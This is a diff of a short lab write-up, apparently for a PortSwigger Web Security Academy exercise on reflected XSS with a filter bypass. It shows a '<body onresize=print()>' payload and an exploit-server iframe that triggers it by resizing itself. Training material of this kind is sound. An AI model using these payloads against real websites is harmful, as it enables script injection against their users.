@@ -32,11 +32,11 @@ Reflected XSS / Filter Bypass
 
 ## Payload Used
 
-<body onresize=print()>
+    <body onresize=print()>
 
 Exploit Server
 
-<iframe src="https://0ad600bb0452c3e0815a350c00f90084.web-security-academy.net?search=<body onresize=print()>" onload=this.style.width='100px'>
+    <iframe src="https://0ad600bb0452c3e0815a350c00f90084.web-security-academy.net?search=<body onresize=print()>" onload=this.style.width='100px'>
 
 ## Result
 Successfully bypassed the filtering mechanism and executed arbitrary JavaScript.
